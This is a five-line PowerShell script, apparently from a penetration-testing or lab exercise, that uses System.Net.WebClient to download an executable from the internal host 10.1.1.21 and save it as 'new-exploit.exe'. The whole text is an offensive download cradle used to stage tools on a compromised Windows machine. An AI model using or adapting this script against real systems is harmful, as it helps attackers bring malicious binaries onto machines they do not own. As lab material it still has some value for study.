$storageDir = $pwd
$webclient = New-Object System.Net.WebClient
$url = "http://10.1.1.21/whoami.exe"
$file ="new-exploit.exe"
$webclient.DownloadFile($url,$file)